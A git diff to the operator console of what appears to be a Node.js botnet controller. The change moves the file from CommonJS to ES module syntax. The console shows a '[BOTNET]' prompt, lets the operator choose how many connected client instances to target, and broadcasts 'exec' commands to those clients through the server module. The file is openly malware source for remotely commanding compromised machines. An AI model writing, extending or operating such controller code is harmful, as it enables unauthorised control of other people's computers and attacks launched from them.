@@ -1,9 +1,10 @@
-const readline = require("readline").createInterface({
+import readline from "readline";
+const rl = readline.createInterface({
 	input: process.stdin,
 	output: process.stdout,
 });
-const fs = require("fs");
-const server = require("./server.js");
+import fs from "fs";
+import { clientModules, broadcast } from "./server.js"
 
 const help = fs.readFileSync("../config/help", "utf8");
 
@@ -25,22 +26,22 @@ const commandsHelp = [
 	},
 ];
 
-function prompt() {
-	readline.question("[BOTNET] ", (message) => {
+export default function prompt() {
+	rl.question("[BOTNET] ", (message) => {
 		message = message.toLowerCase();
 
 		if (message === "instances") {
-			console.log(`Instances: ${clientInstances.length}`);
+			console.log(`Instances: ${clientModules.clientInstances.length}`);
 		}
 
 		if (message.startsWith("instances")) {
-			if (message.split(" ")[1] <= clients.length) {
-				clientInstances = [...clients];
-				clientInstances = clientInstances.slice(0, message.split(" ")[1]);
+			if (message.split(" ")[1] <= clientModules.clients.length) {
+				clientModules.clientInstances = [...clientModules.clients];
+				clientModules.clientInstances = clientModules.clientInstances.slice(0, message.split(" ")[1]);
 			}
 		}
 
-		if (message.split(" ")[1] === "all") clientInstances = [...clients];
+		if (message.split(" ")[1] === "all") clientModules.clientInstances = [...clientModules.clients];
 
 		if (message === "help") console.log(`\n${help}`);
 
@@ -59,12 +60,8 @@ function prompt() {
 			}
 		}
 
-		if (message.startsWith("exec")) server.broadcast(message);
+		if (message.startsWith("exec")) broadcast(message);
 
 		return prompt();
 	});
 }
-
-module.exports = {
-	prompt: prompt,
-};
